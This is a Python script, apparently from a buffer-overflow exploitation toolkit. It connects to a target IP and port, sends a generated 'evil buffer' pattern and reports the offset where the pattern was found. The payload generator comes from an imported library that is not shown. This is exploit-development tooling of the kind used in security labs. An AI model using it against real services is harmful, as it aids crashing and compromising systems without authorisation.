import errno
import socket

import asyncio
import time
import sys
from threading import Thread
from JihadLibrary import JihadLibrary
# copy right

# Main function
async def main():
    JihadLibrary().copyRight()
    ip = JihadLibrary().ip()
    port = JihadLibrary().port()
    payload=""
    totalCharacter=0
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s = JihadLibrary().connectToSocket(socket, ip, port)

          while True:
              print("____________________________________________")
              # receiver(s)
              JihadLibrary().receiveFromSocket(s)
              print("____________________________________________")
              generate = input("Do you want to generate payload in this field (y for yes and n for no)?") or "n"
              if generate == "y":
                  print("____________________________________________")
                  payload, totalCharacter = JihadLibrary().generatePayload()
                  print("____________________________________________")
                  JihadLibrary().sendToSocket(s, payload)
                  print("____________________________________________")
                  print("The evil buffer has been send...")

                  break
              else:
                  print("____________________________________________")
                  payload = JihadLibrary().generateMessage(s)
                  print("____________________________________________")   
                  JihadLibrary().sendToSocket(s, payload)

          s.shutdown(socket.SHUT_WR)
          s.close()

    except socket.error as msg:
      print(msg)
      #print("Fuzzing crashed at " + str(len(Fields[0])) + " bytes")
      print(ip + ":" + str(port) + " has been disconnected")
      sys.exit()
    finally:
      print(payload)
      print(totalCharacter)
      foundAt = JihadLibrary().offsetPattern(payload, totalCharacter)
      print("found at", foundAt)

# Calling the main function
asyncio.run(main())
